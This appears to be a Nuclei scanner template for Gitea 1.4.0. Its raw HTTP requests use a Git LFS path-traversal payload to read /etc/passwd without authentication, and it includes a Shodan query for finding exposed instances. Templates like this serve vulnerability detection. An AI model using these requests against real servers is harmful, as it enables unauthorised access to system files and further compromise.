http:
- extractors:
  - group: 1
    internal: true
    name: repo
    regex:
    - '"name":".*","full_name":"(.*)","description"'
    type: regex
  matchers:
  - part: body_3
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: header_3
    type: word
    words:
    - application/octet-stream
  matchers-condition: and
  raw:
  - 'GET /api/v1/repos/search?limit=1 HTTP/1.1

    Host: {{Hostname}}

    '
  - "POST /{{repo}}.git/info/lfs/objects HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\nAccept: application/vnd.git-lfs+json\n\n{\n    \"Oid\": \"\
    ....../../../etc/passwd\",\n    \"Size\": 1000000,\n    \"User\" : \"{{randstr}}\"\
    ,\n    \"Password\" : \"{{randstr}}\",\n    \"Repo\" : \"{{randstr}}\",\n    \"\
    Authorization\" : \"{{randstr}}\"\n}\n"
  - 'GET /{{repo}}.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth HTTP/1.1

    Host: {{Hostname}}

    '
id: gitea-rce
info:
  author: theamanrawat
  description: 'Gitea 1.4.0 is vulnerable to remote code execution.

    '
  metadata:
    max-request: 3
    shodan-query: 'title:"Installation -  Gitea: Git with a cup of tea"'
    verified: true
  name: Gitea 1.4.0 - Remote Code Execution
  reference:
  - https://www.exploit-db.com/exploits/44996
  - https://github.com/kacperszurek/exploits/blob/master/Gitea/gitea_lfs_rce.py
  severity: critical
  tags: gitea,rce,unauth,edb
